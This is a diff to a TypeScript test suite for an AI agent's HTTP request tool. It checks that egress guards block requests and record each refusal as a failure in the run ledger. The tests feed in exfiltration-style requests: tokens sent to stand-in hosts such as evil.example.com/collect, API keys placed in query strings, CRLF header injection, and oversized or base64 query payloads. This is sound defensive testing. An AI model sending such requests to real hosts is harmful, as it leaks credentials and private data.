@@ -13,6 +13,7 @@ import type { ToolCallCountProvider, ToolContext } from '../../core/tool-context
 import type { LynoxUserConfig, SessionCounters } from '../../types/index.js';
 import type { CapabilityContract } from '../../types/capability-contract.js';
 import { setPinnedTransportForTests } from '../../core/network-guard.js';
+import { ToolSoftFailure } from '../../core/tool-soft-failure.js';
 import type { PinnedTransportInput } from '../../core/network-guard.js';
 
 // fetchPinned replaces the legacy `fetch(currentUrl, init)` call in
@@ -24,6 +25,35 @@ const lastPinnedInputs: PinnedTransportInput[] = [];
 let restorePinnedTransport: (() => void) | undefined;
 
 const handler = httpRequestTool.handler;
+
+/**
+ * What the MODEL reads, whichever way the handler delivered it.
+ *
+ * Every refusal this handler RETURNED is now a `ToolSoftFailure` — the payload
+ * takes the ordinary result path (the agent still reads it and adapts) while
+ * the reason goes to the ledger, so a blocked call stops being
+ * indistinguishable from a successful silent one. The network-layer refusals
+ * were already THROWN and did not move. The assertions that predate the change
+ * are about the PAYLOAD and are unchanged by it; this unwraps the transport so
+ * they keep saying exactly what they said.
+ *
+ * ⚠ It deliberately does NOT assert the transport, and no test using it can:
+ * turn any block back into a plain `return` and every one of them still passes.
+ * That is the trap #1123's own notes recorded — payload assertions routed
+ * through a helper that accepts either transport let the signal's removal
+ * survive. The transport is therefore asserted separately and explicitly, once
+ * per refusal, in "every refusal is recorded as a failure, not a silent
+ * success". Those are the tests a mutation has to kill, and this helper exists
+ * so that they are the only ones that can.
+ */
+async function visible(...args: Parameters<typeof handler>): Promise<string> {
+  try {
+    return await handler(...args);
+  } catch (err) {
+    if (err instanceof ToolSoftFailure) return err.agentVisibleResult;
+    throw err;
+  }
+}
 
 // Each test gets a fresh ToolContext + a fresh SessionCounters object via
 // beforeEach. The handler reads network policy / rate-limits from
@@ -322,7 +352,7 @@ describe('httpRequestTool', () => {
 
       it('a POST outside the contract is still blocked headless (the grant is call-specific)', async () => {
         mockDnsPublic();
-        const res = await handler(
+        const res = await visible(
           { url: 'https://evil.test/v1/report', method: 'POST', body: '{}' },
           makeAgent({ capabilityContract: contract }),
         );
@@ -663,7 +693,7 @@ describe('httpRequestTool', () => {
         await handler({ url: 'http://example.com' }, makeAgent());
       }
       // Next should be blocked (counter is at 100, >= MAX)
-      const result = await handler({ url: 'http://example.com' }, makeAgent());
+      const result = await visible({ url: 'http://example.com' }, makeAgent());
       expect(result).toContain('Request limit reached');
     });
 
@@ -707,13 +737,13 @@ describe('httpRequestTool', () => {
 
     it('blocks when hourly limit exceeded', async () => {
       applyHttpRateLimits(testCtx, mockProvider({ 1: 50 }), 50);
-      const result = await handler({ url: 'http://example.com' }, makeAgent());
+      const result = await visible({ url: 'http://example.com' }, makeAgent());
       expect(result).toContain('Hourly request limit reached');
     });
 
     it('blocks when daily limit exceeded', async () => {
       applyHttpRateLimits(testCtx, mockProvider({ 24: 200 }), undefined, 200);
-      const result = await handler({ url: 'http://example.com' }, makeAgent());
+      const result = await visible({ url: 'http://example.com' }, makeAgent());
       expect(result).toContain('Daily request limit reached');
     });
 
@@ -782,7 +812,7 @@ describe('httpRequestTool', () => {
 
     it('blocks POST with API key in body', async () => {
       mockDnsPublic();
-      const result = await handler({
+      const result = await visible({
         url: 'http://example.com/api',
         method: 'POST',
         body: JSON.stringify({ key: 'sk-ant-api03-abc123def456ghi789jkl012mno345pqr678' }),
@@ -793,7 +823,7 @@ describe('httpRequestTool', () => {
 
     it('blocks PUT with private key in body', async () => {
       mockDnsPublic();
-      const result = await handler({
+      const result = await visible({
         url: 'http://example.com/upload',
         method: 'PUT',
         body: '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqh...',
@@ -822,7 +852,7 @@ describe('httpRequestTool', () => {
   describe('egress control: request header secret blocking (T2-S1)', () => {
     it('blocks POST with Anthropic API key in Authorization header', async () => {
       mockDnsPublic();
-      const result = await handler({
+      const result = await visible({
         url: 'http://example.com/api',
         method: 'POST',
         headers: { Authorization: 'Bearer sk-ant-api03-abc123def456ghi789jkl012mno345pqr678' },
@@ -835,7 +865,7 @@ describe('httpRequestTool', () => {
 
     it('blocks GET with GitHub PAT in custom header (read-method exfil)', async () => {
       mockDnsPublic();
-      const result = await handler({
+      const result = await visible({
         url: 'http://example.com/api',
         headers: { 'X-Forward-Token': 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij' },
       }, makeAgent());
@@ -870,7 +900,7 @@ describe('httpRequestTool', () => {
 
     it('blocks GET with an API key in the query string', async () => {
       mockDnsPublic();
-      const result = await handler({
+      const result = await visible({
         url: `http://example.com/collect?token=${ANT_KEY}`,
       }, makeAgent());
       expect(result).toContain('Blocked');
@@ -881,7 +911,7 @@ describe('httpRequestTool', () => {
     it('blocks POST with a key in the query even when the body is clean', async () => {
       // The body scan alone would miss this — the secret is in the URL, not the body.
       mockDnsPublic();
-      const result = await handler({
+      const result = await visible({
         url: `http://example.com/api?leak=${GH_TOKEN}`,
         method: 'POST',
         body: JSON.stringify({ message: 'hello world' }),
@@ -909,7 +939,7 @@ describe('httpRequestTool', () => {
     it('blocks GET with very long query string (no promptUser)', async () => {
       mockDnsPublic();
       const longParam = 'a'.repeat(600);
-      const result = await handler({
+      const result = await visible({
         url: `http://example.com/api?data=${longParam}`,
       }, makeAgent());
       expect(result).toContain('Blocked');
@@ -919,7 +949,7 @@ describe('httpRequestTool', () => {
     it('blocks GET with base64 blob in params (no promptUser)', async () => {
       mockDnsPublic();
       const b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/==';
-      const result = await handler({
+      const result = await visible({
         url: `http://example.com/api?data=${b64}`,
       }, makeAgent());
       expect(result).toContain('Blocked');
@@ -1060,8 +1090,10 @@ describe('httpRequestTool', () => {
     it('blocks an off-baseline host with no accepting profile', async () => {
       applyNetworkPolicy(testCtx, 'guarded', undefined);
       mockDnsPublic();
-      // Early-gate hard-block → agent-visible actionable string (not a throw).
-      const result = await handler({ url: 'https://attacker.example.org/v1' }, makeAgent());
+      // Early-gate hard-block → an agent-visible actionable string. It arrives
+      // as a `ToolSoftFailure` rather than a return, so the ledger can count it;
+      // `visible()` unwraps that, and what the model reads is unchanged.
+      const result = await visible({ url: 'https://attacker.example.org/v1' }, makeAgent());
       expect(result).toContain('not reachable under the current egress policy');
     });
 
@@ -1093,7 +1125,7 @@ describe('httpRequestTool', () => {
       // No secretStore on the stub agent → the OAuth attach block is skipped.
       expect(await handler({ url: 'https://token.provider.net/oauth/token' }, makeAgent())).toContain('HTTP 200');
       // A host NOT in any profile's acceptance stays blocked.
-      const blocked = await handler({ url: 'https://unaccepted.example.com' }, makeAgent());
+      const blocked = await visible({ url: 'https://unaccepted.example.com' }, makeAgent());
       expect(blocked).toContain('not reachable under the current egress policy');
     });
 
@@ -1273,8 +1305,8 @@ describe('httpRequestTool', () => {
 
       const url = `https://api-parallel-deny-${Date.now()}.example.com/v1/x`;
       const results = Promise.all([
-        handler({ url, method: 'POST', body: '{}' }, agent),
-        handler({ url, method: 'POST', body: '{}' }, agent),
+        visible({ url, method: 'POST', body: '{}' }, agent),
+        visible({ url, method: 'POST', body: '{}' }, agent),
       ]);
 
       await new Promise((r) => setTimeout(r, 5));
@@ -1299,7 +1331,7 @@ describe('httpRequestTool', () => {
       const agent = { promptUser, sessionCounters: testCounters } as never;
 
       const url = `https://api-reprompt-${Date.now()}.example.com/v1/x`;
-      const first = await handler({ url, method: 'POST', body: '{}' }, agent);
+      const first = await visible({ url, method: 'POST', body: '{}' }, agent);
       expect(first).toContain('denied');
 
       // Second call (sequential, not concurrent) should prompt again — the
@@ -1738,7 +1770,7 @@ describe('httpRequestTool', () => {
         sessionCounters: testCounters,
       } as never;
 
-      const result = await handler({ url: 'https://shop.myshopify.com/admin/api/2026-04/graphql.json' }, agent);
+      const result = await visible({ url: 'https://shop.myshopify.com/admin/api/2026-04/graphql.json' }, agent);
 
       expect(result).toMatch(/non-vetted sub-processor/i);
       expect(result).toContain('shop.myshopify.com');
@@ -1895,7 +1927,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} }));
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { WOO_CK: 'ck', WOO_CS: 'cs' }));
       expect(result).toMatch(/non-vetted sub-processor/i);
       expect(fetchMock).not.toHaveBeenCalled(); // nothing left the machine
@@ -1909,7 +1941,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn();
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { WOO_CK: 'ck' }));
       expect(result).toContain('WOO_CS');
       expect(fetchMock).not.toHaveBeenCalled();
@@ -1920,7 +1952,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn();
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' }, agentWith(store, {}));
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' }, agentWith(store, {}));
       expect(result).toMatch(/does not name two vault keys/i);
       expect(fetchMock).not.toHaveBeenCalled();
     });
@@ -1939,7 +1971,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} }));
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { MAIL_ACCOUNT_1: 'imap-blob', WOO_CS: 'cs' }));
       expect(result).toMatch(/protected secret/i);
       expect(fetchMock).not.toHaveBeenCalled(); // nothing left the machine
@@ -1958,7 +1990,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} }));
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { ANTHROPIC_API_KEY: 'sk-ant-secret', WOO_CS: 'cs' }));
       expect(result).toMatch(/protected secret/i);
       expect(fetchMock).not.toHaveBeenCalled();
@@ -1974,7 +2006,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn();
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { WOO_CK: 'ck', WOO_CS: '' }));
       expect(result).toContain('WOO_CS');
       expect(fetchMock).not.toHaveBeenCalled();
@@ -1990,7 +2022,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn().mockResolvedValue(createMockResponse({ status: 200, json: {} }));
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'http://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'http://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { WOO_CK: 'ck', WOO_CS: 'cs' }));
       expect(result).toMatch(/non-HTTPS/i);
       expect(fetchMock).not.toHaveBeenCalled();
@@ -2014,7 +2046,7 @@ describe('httpRequestTool', () => {
       mockDnsPublic();
       const fetchMock = vi.fn();
       vi.stubGlobal('fetch', fetchMock);
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { WOO_CK: 'ck', WOO_CS: 'cs' }));
       expect(result).toMatch(/non-vetted sub-processor/i);
       expect(fetchMock).not.toHaveBeenCalled();
@@ -2029,7 +2061,7 @@ describe('httpRequestTool', () => {
       });
       mockDnsPublic();
       vi.stubGlobal('fetch', vi.fn());
-      const result = await handler({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
+      const result = await visible({ url: 'https://shop.example.com/wp-json/wc/v3/products' },
         agentWith(store, { WOO_CS: 'cs' }));
       expect(result).toContain('WOO_CK');
       expect(result).not.toContain('WOO_CS');
@@ -2238,7 +2270,7 @@ describe('httpRequestTool', () => {
         mockDnsPublic();
         vi.stubGlobal('fetch', vi.fn());
         lastPinnedInputs.length = 0;
-        const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { [key]: 'sk-ant-secret' }));
+        const result = await visible({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { [key]: 'sk-ant-secret' }));
         expect(result).toMatch(/protected secret/i);
         expect(lastPinnedInputs).toHaveLength(0);
       }
@@ -2292,7 +2324,7 @@ describe('httpRequestTool', () => {
       const store = await storeWith({ type: 'header', header_name: 'X-Key\r\nX-Evil: yes', vault_keys: ['BEXIO_API_TOKEN'] });
       mockDnsPublic();
       vi.stubGlobal('fetch', vi.fn());
-      const result = await handler({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: 'v' }));
+      const result = await visible({ url: 'https://api.bexio.com/3.0/users/me' }, agentWith(store, { BEXIO_API_TOKEN: 'v' }));
       expect(result).toContain('CRLF');
       expect(lastPinnedInputs).toHaveLength(0);
     });
@@ -2320,7 +2352,7 @@ describe('httpRequestTool', () => {
       const store = await storeWith({ type: 'bearer', vault_keys: ['BEXIO_API_TOKEN'] });
       mockDnsPublic();
       vi.stubGlobal('fetch', vi.fn());
-      const result = await handler(
+      const result = await visible(
         { url: 'https://api.bexio.com/3.0/users/me', headers: { 'X-Exfil': `Bearer ${JWT}` } },
         agentWith(store, { BEXIO_API_TOKEN: 'tok' }),
       );
@@ -2333,7 +2365,7 @@ describe('httpRequestTool', () => {
       const store = new ApiStore();
       mockDnsPublic();
       vi.stubGlobal('fetch', vi.fn());
-      const result = await handler(
+      const result = await visible(
         { url: 'https://evil.example.com/collect', headers: { Authorization: `Bearer ${JWT}` } },
         agentWith(store, {}),
       );
@@ -2559,7 +2591,7 @@ describe('httpRequestTool', () => {
 
       const secretStore = makeSecretStore({});
       const agent = { toolContext: { apiStore: store }, sessionCounters: testCounters, secretStore } as never;
-      const result = await handler({ url: 'https://shop.myshopify.com/admin/api/2026-04/graphql.json', method: 'GET' }, agent);
+      const result = await visible({ url: 'https://shop.myshopify.com/admin/api/2026-04/graphql.json', method: 'GET' }, agent);
 
       expect(result).toContain('SHOPIFY_SEO_ACCESS_TOKEN');
       expect(result).toContain('fetch_token');
@@ -2829,5 +2861,293 @@ describe('http_request tool description — the session cap is stated, not disco
     // each firing gets fresh counters (runner.ts `parentSessionCounters ?? {…}`).
     expect(description).toMatch(/task_create/);
     expect(description).toMatch(/fresh budget/i);
+  });
+});
+
+/**
+ * Every refusal this handler can produce, enumerated — the detector for the
+ * defect, not for one instance of it.
+ *
+ * A refusal used to be RETURNED, so `agent.ts` booked it as a success with an
+ * empty `output_json`, and `run-history-analytics.ts` — which derives
+ * `error_count` from `output_json != ''` and reads nothing else — counted zero.
+ * In the ledger a blocked call was byte-for-byte a successful call with nothing
+ * to say. An agent that cannot tell those apart turns a refusal into a
+ * fact-claim: measured on a real thread, one reported a PUBLIC repository as
+ * non-existent after a guarded block it could not perceive.
+ *
+ * The list below is deliberately by MEMBER, not by shape. A regex over the
+ * source would pass on the day someone writes the fifteenth refusal in a form
+ * it does not match; a row here fails the moment its own site returns instead
+ * of throwing. It is also the only place in this file that asserts the
+ * SOFT-FAILURE transport: the `rejects.toThrow` assertions elsewhere pin the
+ * HARD-error path, which is a different exit and was never silent, and every
+ * other block assertion goes through `visible()`, which unwraps the transport
+ * by design and would survive the revert.
+ *
+ * What it still cannot do, stated so nobody reads more into it:
+ *
+ *  - It does not notice a FIFTEENTH refusal added as a plain `return`. Nothing
+ *    cheap can — `friendlyBlockMessage` is not the only funnel (nine of these
+ *    fourteen phrase themselves) and a source-level count would be theatre. The
+ *    rule is written where a new refusal is written instead: see
+ *    `blockedFriendly` in http.ts.
+ *  - It stops at the throw. Nothing here drives throw → `agent.ts` →
+ *    `output_json` → `error_count`; that chain holds by COMPOSITION with
+ *    `agent.test.ts`'s "ToolSoftFailure — completed but not successful", whose
+ *    fixtures are tool-agnostic. Composition is a weaker claim than an
+ *    end-to-end test, and it is the claim being made — and it covers the
+ *    SESSION sink only. `http_request` is also inline-available to pipeline
+ *    steps, whose ledger row comes from a different sink that never reads
+ *    `.reason`; there the chain does not hold.
+ */
+describe('every refusal is recorded as a failure, not a silent success', () => {
+  /** Drive the handler and demand a refusal — the TRANSPORT, not just the text. */
+  async function refusal(...args: Parameters<typeof handler>): Promise<ToolSoftFailure> {
+    let result: string;
+    try {
+      result = await handler(...args);
+    } catch (err) {
+      if (err instanceof ToolSoftFailure) return err;
+      throw err;
+    }
+    throw new Error(`expected a refusal, got a normal return: ${result.slice(0, 200)}`);
+  }
+
+  /** Assert the pair the ledger depends on: a reason to count, a payload unchanged. */
+  function expectRecorded(f: ToolSoftFailure, visibleText: string | RegExp): void {
+    // The reason IS the ledger row. `agent.ts` writes it into `output_json`,
+    // and `error_count` is derived from it (`output_json != '' AND != '{}'`) —
+    // the `isError` flag beside it is never persisted. So an empty reason is the
+    // whole defect arriving through a different door: a refusal that looks
+    // recorded and counts zero.
+    expect(f.reason.trim().length, 'an empty reason books as a success again').toBeGreaterThan(0);
+    // …and the model must still read exactly what it read before.
+    if (typeof visibleText === 'string') expect(f.agentVisibleResult).toContain(visibleText);
+    else expect(f.agentVisibleResult).toMatch(visibleText);
+  }
+
+  const countProvider = (counts: Record<number, number>): ToolCallCountProvider => ({
+    getToolCallCountSince: (_t: string, hours: number) => counts[hours] ?? 0,
+  });
+
+  async function apiStoreWith(auth: Record<string, unknown>): Promise<unknown> {
+    const { ApiStore } = await import('../../core/api-store.js');
+    const store = new ApiStore();
+    store.register({
+      id: 'woo',
+      name: 'WooCommerce',
+      base_url: 'https://shop.example.com/wp-json/wc/v3',
+      description: 'Shop',
+      auth: auth as never,
+    });
+    return store;
+  }
+
+  it('1/14 — hourly HTTP rate limit', async () => {
+    applyHttpRateLimits(testCtx, countProvider({ 1: 50 }), 50);
+    expectRecorded(
+      await refusal({ url: 'http://example.com' }, makeAgent()),
+      'Hourly request limit reached',
+    );
+  });
+
+  it('2/14 — daily HTTP rate limit', async () => {
+    applyHttpRateLimits(testCtx, countProvider({ 24: 200 }), undefined, 200);
+    expectRecorded(
+      await refusal({ url: 'http://example.com' }, makeAgent()),
+      'Daily request limit reached',
+    );
+  });
+
+  it('3/14 — per-session HTTP limit', async () => {
+    testCounters.httpRequests = MAX_REQUESTS_PER_SESSION;
+    expectRecorded(
+      await refusal({ url: 'http://example.com' }, makeAgent()),
+      'Request limit reached for this session',
+    );
+  });
+
+  it('4/14 — per-API rate limit from the ApiStore', async () => {
+    // This site sits INSIDE a `try { … } catch {}` whose catch exists for a
+    // malformed URL. A bare catch around a throw would swallow the refusal and
+    // let the request proceed — the mutation that removes the `instanceof`
+    // re-throw is killed here and nowhere else.
+    testCtx.apiStore = {
+      size: 1,
+      checkRateLimit: () => 'Blocked: hourly limit for api.rated.example.com reached',
+      getByHostname: () => undefined,
+    } as never;
+    expectRecorded(
+      await refusal({ url: 'https://api.rated.example.com/v1/x' }, makeAgent()),
+      'Hourly request limit reached',
+    );
+  });
+
+  it('5/14 — CRLF in a request header', async () => {
+    expectRecorded(
+      await refusal({ url: 'http://example.com', headers: { 'X-Bad\r\nX-Evil': 'yes' } }, makeAgent()),
+      'invalid characters (CRLF/null)',
+    );
+  });
+
+  it('6/14 — the engine refuses to attach a managed credential', async () => {
+    // No `custom_endpoint_ack` on the profile → the refusal is the non-vetted
+    // sub-processor one. Which of the nine refusal strings fires does not
+    // matter here; that they all leave through `auth.refusal` does, and that
+    // exit was a plain `return` before this change.
+    const store = await apiStoreWith({ type: 'oauth2', vault_keys: ['WOO_TOKEN'] });
+    mockDnsPublic();
+    const agent = {
+      toolContext: { apiStore: store },
+      secretStore: { resolve: () => null },
+      sessionCounters: testCounters,
+    } as never;
+    expectRecorded(
+      await refusal({ url: 'https://shop.example.com/wp-json/wc/v3/products' }, agent),
+      'non-vetted sub-processor',
+    );
+  });
+
+  it('7/14 — a secret in a request header', async () => {
+    mockDnsPublic();
+    expectRecorded(
+      await refusal({
+        url: 'http://example.com/api',
+        headers: { Authorization: 'Bearer sk-ant-api03-abc123def456ghi789jkl012mno345pqr678' },
+      }, makeAgent()),
+      'appears to contain a',
+    );
+  });
+
+  it('8/14 — a secret in the request URL', async () => {
+    mockDnsPublic();
+    expectRecorded(
+      await refusal({
+        url: 'http://example.com/api?api_key=sk-ant-api03-abc123def456ghi789jkl012mno345pqr678',
+      }, makeAgent()),
+      'request URL appears to contain a',
+    );
+  });
+
+  it('9/14 — the guarded egress policy — the block from the real incident', async () => {
+    applyNetworkPolicy(testCtx, 'guarded', undefined);
+    mockDnsPublic();
+    const f = await refusal({ url: 'https://api.github.com/repos/lynox-ai/lynox' }, makeAgent());
+    expectRecorded(f, 'not reachable under the current egress policy');
+    // The friendly text names no host and no rule on purpose. The ledger reason
+    // must name both, or an operator reading the row still cannot see WHICH
+    // request was refused and WHY — that was the expensive half of
+    // reconstructing the 2026-08-23 thread, and it is the entire difference
+    // between `blockedFriendly` and `blockedVerbatim`.
+    //
+    // These assertions are the ONLY thing pinning that difference. A separate
+    // test asserting merely `reason !== agentVisibleResult` was written first,
+    // deleted as strictly weaker — and the deletion was a NET LOSS until the
+    // last two lines below were added, which the commit message claiming
+    // otherwise did not notice. Its `/^Blocked:/` pair had no home here, so
+    // `agentVisibleResult := 'Blocked: ' + friendly` passed: the technical
+    // prefix leaking to the model, which is the exact distinction being
+    // asserted, and `Blocked:` is a live dispatch key at http.ts:821 and :1140.
+    // Folding a test in means folding in ALL of it. (Second delta round.)
+    expect(f.reason).toContain('api.github.com');
+    expect(f.reason).toContain('guarded egress policy');
+    expect(f.reason).not.toBe(f.agentVisibleResult);
+    expect(f.reason, 'the ledger gets the technical string').toMatch(/^Blocked:/);
+    expect(f.agentVisibleResult, 'the model must never read the dispatch prefix').not.toMatch(/^Blocked:/);
+  });
+
+  it('10/14 — GET exfiltration with no interactive prompt', async () => {
+    mockDnsPublic();
+    expectRecorded(
+      await refusal({ url: `http://example.com/api?data=${'a'.repeat(600)}` }, makeAgent()),
+      'query string',
+    );
+  });
+
+  it('11/14 — GET exfiltration denied by the user', async () => {
+    mockDnsPublic();
+    const promptUser = vi.fn().mockResolvedValue('Deny');
+    expectRecorded(
+      await refusal({ url: `http://example.com/api?data=${'a'.repeat(600)}` }, makeAgent({ promptUser })),
+      'denied by user',
+    );
+  });
+
+  it('12/14 — a secret in the request body', async () => {
+    mockDnsPublic();
+    expectRecorded(
+      await refusal({
+        url: 'http://example.com/api',
+        method: 'POST',
+        body: JSON.stringify({ key: 'sk-ant-api03-abc123def456ghi789jkl012mno345pqr678' }),
+      }, agentWithPromptFn()),
+      'request body appears to contain a',
+    );
+  });
+
+  it('13/14 — an outbound write with no interactive prompt', async () => {
+    mockDnsPublic();
+    expectRecorded(
+      await refusal({ url: 'https://write.example.com/v1/x', method: 'POST', body: '{}' }, makeAgent()),
+      'requires user consent but no interactive prompt is available',
+    );
+  });
+
+  it('14/14 — an outbound write denied by the user', async () => {
+    mockDnsPublic();
+    const promptUser = vi.fn().mockResolvedValue('Deny');
+    expectRecorded(
+      await refusal({ url: 'https://write2.example.com/v1/x', method: 'POST', body: '{}' }, makeAgent({ promptUser })),
+      'denied by user',
+    );
+  });
+
+  it('a self-phrased refusal is NOT run through the friendly rewriter — the host is model-chosen', async () => {
+    // Why `blockedVerbatim` exists as a second helper, asserted rather than
+    // claimed. `friendlyBlockMessage` matches on substrings, and several of
+    // these refusals interpolate a hostname the MODEL supplies. A request to
+    // `daily-report.example.com` contains "daily", so routing it through the
+    // rewriter answers a consent refusal with "Daily request limit reached. Try
+    // again tomorrow." — a different and false statement, which teaches the
+    // model to wait out a limit that was never hit instead of asking for
+    // consent. Reachable from tool input, not hypothetical.
+    mockDnsPublic();
+    const f = await refusal(
+      { url: 'https://daily-report.example.com/v1/x', method: 'POST', body: '{}' },
+      makeAgent(),
+    );
+    expect(f.agentVisibleResult).toContain('requires user consent');
+    expect(f.agentVisibleResult).not.toContain('Daily request limit');
+  });
+
+  it('a soft failure raised INSIDE the request try is not re-wrapped into a hard error', async () => {
+    // The trap `blockedFriendly`'s doc comment would otherwise set. Its reason
+    // starts with "Blocked:", and `ToolSoftFailure` carries the reason as its
+    // `.message` — so the outer catch's `startsWith('Blocked:')` branch matches
+    // it, re-throws it as an ordinary Error, and maps an already-friendly
+    // string through `friendlyBlockMessage` a second time. The refusal would
+    // reach the model as `is_error` with a doubly-translated message: a
+    // behaviour change, arriving silently, in the one region of the file where
+    // the documented rule is unsafe.
+    //
+    // No refusal site is inside that try today; the rule invites the fifteenth.
+    mockDnsPublic();
+    const soft = new ToolSoftFailure('what the model reads', 'Blocked: something the guard refused');
+    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(soft));
+    const f = await refusal({ url: 'https://inside-the-try.example.com/v1/x' }, makeAgent());
+    expect(f).toBe(soft);
+    expect(f.agentVisibleResult).toBe('what the model reads');
+  });
+
+  it('a request that SUCCEEDS is still a plain return — the fix must not book success as failure', async () => {
+    // The counter-direction, and it is not decoration: booking everything as a
+    // failure would satisfy every assertion above and make `error_count` exactly
+    // as useless, pointing the other way. Same reasoning as `web_research`
+    // refusing to call an empty search result a failure.
+    mockDnsPublic();
+    vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ status: 200, body: 'ok' })));
+    const result = await handler({ url: 'https://plain.example.com/v1/x' }, makeAgent());
+    expect(result).toContain('HTTP 200');
   });
 });
